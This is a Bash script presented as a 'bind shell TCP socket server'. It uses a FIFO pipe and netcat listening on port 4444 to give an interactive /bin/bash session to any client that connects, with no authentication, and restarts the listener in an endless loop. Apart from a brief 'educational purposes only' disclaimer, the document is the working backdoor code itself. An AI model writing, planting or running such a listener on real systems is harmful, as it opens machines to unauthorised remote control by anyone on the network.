#!/usr/bin/env bash
#===============================================================================
# TITLE:        Functional Bash Bind shell TCP Socket Server
# DESCRIPTION:  A reliable, single-threaded TCP socket listener written in Bash.
#               It bypasses standard stream buffering issues by establishing a
#               direct bidirectional loop using a temporary named pipe (FIFO).
#               This ensures immediate command execution and response streaming.
#
# USAGE:        ./server.sh
#               Connect via: nc <ip_address> 4444
#
# DISCLAIMER:  This code is for educational purposes only. Use it at your own risk.
#===============================================================================

PORT=4444
FIFO_PIPE="/tmp/bash_lab_pipe"

rm -f "$FIFO_PIPE"
mkfifo "$FIFO_PIPE"

echo "Server listening on port $PORT..."

while true; do
    echo "[*] Waiting for a client to connect..."
    
    (
        echo -e "Connected to the Bash bind shell server.\nType your commands (or 'exit' to disconnect)\n"
        cat "$FIFO_PIPE"
    ) | /bin/bash -i 2>&1 | nc -lvnp $PORT > "$FIFO_PIPE"
    
    echo "[*] Session ended. Restarting listener..."
    sleep 1
done
